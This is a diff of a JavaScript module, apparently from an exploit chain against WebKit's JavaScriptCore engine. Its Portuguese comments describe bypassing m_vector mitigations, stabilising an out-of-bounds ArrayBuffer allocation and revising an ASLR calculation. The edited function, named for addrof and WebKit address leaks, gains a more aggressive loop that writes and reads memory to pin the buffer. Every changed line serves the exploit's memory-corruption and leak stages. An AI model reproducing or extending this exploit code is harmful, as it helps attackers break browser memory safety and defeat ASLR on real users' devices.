@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v20 - Fortificando Alocacao OOB - Aquecimento Mais Agressivo)
+// js/script3/testArrayBufferVictimCrash.mjs (v20 - Fortificando Alocacao OOB - Calculo ASLR Revisado)
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
@@ -22,7 +22,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v20 - Fortificando Alocacao OOB - Aquecimento Mais Agressivo"; // Versão atualizada
+export const FNAME_MODULE = "v20 - Fortificando Alocacao OOB - Calculo ASLR Revisado"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -363,12 +363,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         try {
             if (oob_array_buffer && oob_array_buffer.byteLength > 0) {
                 const tempUint8View = new Uint8Array(oob_array_buffer);
-                for (let i = 0; i < Math.min(1000, tempUint8View.length); i++) {
-                    tempUint8View[i] = i % 255; // Escreve para forçar atividade de memória
+                // Acessos mais agressivos e variados para forçar o JIT a "fixar" o buffer
+                for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) { // Acessar a cada 8 bytes
+                    tempUint8View[i] = i % 255;
+                    tempUint8View[i+1] = (i+1) % 255;
+                    tempUint8View[i+2] = (i+2) % 255;
+                    tempUint8View[i+3] = (i+3) % 255;
+                    tempUint8View[i+4] = (i+4) % 255;
+                    tempUint8View[i+5] = (i+5) % 255;
+                    tempUint8View[i+6] = (i+6) % 255;
+                    tempUint8View[i+7] = (i+7) % 255;
                 }
-                for (let i = 0; i < Math.min(1000, tempUint8View.length); i++) {
+                 for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) {
                     let val = tempUint8View[i]; // Lê para forçar atividade de memória
-                }
+                 }
                 logFn(`[FASE 2] oob_array_buffer_real aquecido/pinado com sucesso.`, "good");
             }
         } catch (e) {
